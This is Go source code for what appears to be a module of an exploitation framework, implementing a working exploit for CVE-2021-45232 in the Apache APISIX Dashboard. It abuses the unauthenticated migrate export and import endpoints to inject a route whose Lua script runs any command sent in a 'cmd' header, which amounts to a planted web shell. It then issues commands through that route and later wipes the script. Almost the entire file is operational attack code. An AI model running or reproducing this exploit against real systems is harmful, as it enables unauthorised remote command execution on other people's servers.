package exp_apisix

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"github.com/lz520520/railgunlib/pkg/utils/lznet/lzhttp"
	"hash/crc32"
	"net/url"
	"strings"
)

var (
	tag = "C202145232"
)

type Exp_CVE_2021_45232 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_CVE_2021_45232) Attack_cmd1() (expResult exp_model.ExpResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload

	headers.Set("cmd", self.MustGetStringParam("cmd"))

	// 发送请求
	httpresp := self.HttpGet(self.Params.BaseParam.Target, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.Result = httpresp.Body
	return
}

type Config struct {
	Counsumers    []interface{} `json:"Counsumers"`
	Routes        []Routes      `json:"Routes"`
	Services      []interface{} `json:"Services"`
	SSLs          []interface{} `json:"SSLs"`
	Upstreams     []interface{} `json:"Upstreams"`
	Scripts       []interface{} `json:"Scripts"`
	GlobalPlugins []interface{} `json:"GlobalPlugins"`
	PluginConfigs []interface{} `json:"PluginConfigs"`
}
type Routes struct {
	ID         string   `json:"id"`
	CreateTime int      `json:"create_time"`
	UpdateTime int      `json:"update_time"`
	Uris       []string `json:"uris"`
	Name       string   `json:"name"`
	Methods    []string `json:"methods"`
	Script     string   `json:"script"`
	Status     int      `json:"status"`
}

func (self *Exp_CVE_2021_45232) Attack_getmsg1() (expResult exp_model.ExpResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 导出配置
	httpresp := self.HttpGet(goutils.AppendUri(self.Params.BaseParam.Target, "/apisix/admin/migrate/export"), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.RawResult = httpresp.Body
	if len(httpresp.Body) > 5 {
		httpresp.Body = httpresp.Body[:len(httpresp.Body)-4]
	}

	// 反序列化返回数据
	config := new(Config)
	err := json.Unmarshal([]byte(httpresp.Body), config)
	if err != nil {
		expResult.Err = err.Error()
		return
	}
	if config.Routes == nil {
		config.Routes = make([]Routes, 0)
	}

	exist := false
	evilScript := "local file = io.popen(ngx.req.get_headers()['cmd'],'r') \n local output = file:read('*all') \n file:close() \n ngx.say(output)"
	// 生成恶意路由
	uri := "/" + goutils.RandStr(5)
	id := "1" + goutils.RandDigital(17)
	evilRoute := Routes{
		ID:         id,
		CreateTime: 1640674554,
		UpdateTime: 1640677637,
		Uris:       []string{uri},
		Name:       tag,
		Methods:    []string{"GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "CONNECT", "TRACE"},
		Script:     evilScript,
		Status:     1,
	}
	// 这里的逻辑是，判断是否有已经写入的payload，有就覆盖，没有就追加新的。
	newRoutes := make([]Routes, 0)
	for _, route := range config.Routes {
		if route.Name == tag && !exist {
			exist = true
			route.Script = evilScript
			id = route.ID
			if len(route.Uris) > 0 {
				uri = route.Uris[0]
			}
		}
		newRoutes = append(newRoutes, route)
	}
	config.Routes = newRoutes
	if !exist {
		// 添加到已有路由里
		config.Routes = append(config.Routes, evilRoute)
	}

	// 解析URL
	u, err := url.Parse(self.Params.BaseParam.Target)
	if err != nil {
		expResult.Err = err.Error()
		return
	}
	defaultApisixUrl := fmt.Sprintf("%s://%s:9080", u.Scheme, u.Hostname())

	// 构造payload
	evilConfig, err := json.Marshal(config)
	if err != nil {
		expResult.Err = err.Error()
		return
	}
	crc32Bytes := make([]byte, 4)
	binary.BigEndian.PutUint32(crc32Bytes, crc32.ChecksumIEEE(evilConfig))
	evilConfig = append(evilConfig, crc32Bytes...)

	multiParts := []lzhttp.PostMultiPart{
		{
			FieldName:   "mode",
			FileName:    "",
			ContentType: "",
			Content:     []byte("overwrite"),
		},
		{
			FieldName:   "file",
			FileName:    "data",
			ContentType: "text/data",
			Content:     evilConfig,
		},
	}
	// 导入配置
	httpresp = self.HttpPostMulti(goutils.AppendUri(self.Params.BaseParam.Target, "/apisix/admin/migrate/import"), multiParts, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}

	expResult.RawResult = httpresp.RawFullResp
	if strings.Contains(httpresp.Body, `"code":0`) {
		self.EchoSuccessMsg("import success.")
		self.EchoSuccessMsg("default apisix url is: " + defaultApisixUrl + uri)
	} else {
		self.EchoErrMsg("import failed.")
	}

	return
}

func (self *Exp_CVE_2021_45232) Attack_getmsg2() (expResult exp_model.ExpResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload

	// 导出请求
	httpresp := self.HttpGet(goutils.AppendUri(self.Params.BaseParam.Target, "/apisix/admin/migrate/export"), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.RawResult = httpresp.Body
	if len(httpresp.Body) > 5 {
		httpresp.Body = httpresp.Body[:len(httpresp.Body)-4]
	}

	// 反序列化返回数据
	config := new(Config)
	err := json.Unmarshal([]byte(httpresp.Body), config)
	if err != nil {
		expResult.Err = err.Error()
		return
	}
	self.EchoSuccessMsg("export config success.")

	if config.Routes == nil {
		return
	}
	newRoutes := make([]Routes, 0)
	for _, route := range config.Routes {
		if route.Name == tag {
			route.Script = "local a=1\nlocal b=2"
			newRoutes = append(newRoutes, route)
		}
	}
	config.Routes = newRoutes

	// 导入
	// 构造payload
	evilConfig, err := json.Marshal(config)
	if err != nil {
		expResult.Err = err.Error()
		return
	}
	crc32Bytes := make([]byte, 4)
	binary.BigEndian.PutUint32(crc32Bytes, crc32.ChecksumIEEE(evilConfig))
	evilConfig = append(evilConfig, crc32Bytes...)

	multiParts := []lzhttp.PostMultiPart{
		{
			FieldName:   "mode",
			FileName:    "",
			ContentType: "",
			Content:     []byte("overwrite"),
		},
		{
			FieldName:   "file",
			FileName:    "data",
			ContentType: "text/data",
			Content:     evilConfig,
		},
	}
	// 导入配置
	httpresp = self.HttpPostMulti(goutils.AppendUri(self.Params.BaseParam.Target, "/apisix/admin/migrate/import"), multiParts, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}

	expResult.RawResult = httpresp.RawFullResp
	if strings.Contains(httpresp.Body, `"code":0`) {
		self.EchoSuccessMsg("import success.")
		self.EchoSuccessMsg("clear success.")

	} else {
		self.EchoErrMsg("import failed.")
	}
	return
}

func init() {
	exp_register.ExpStructRegister(&Exp_CVE_2021_45232{}, "exp_CVE_2021_45232.yml")

}
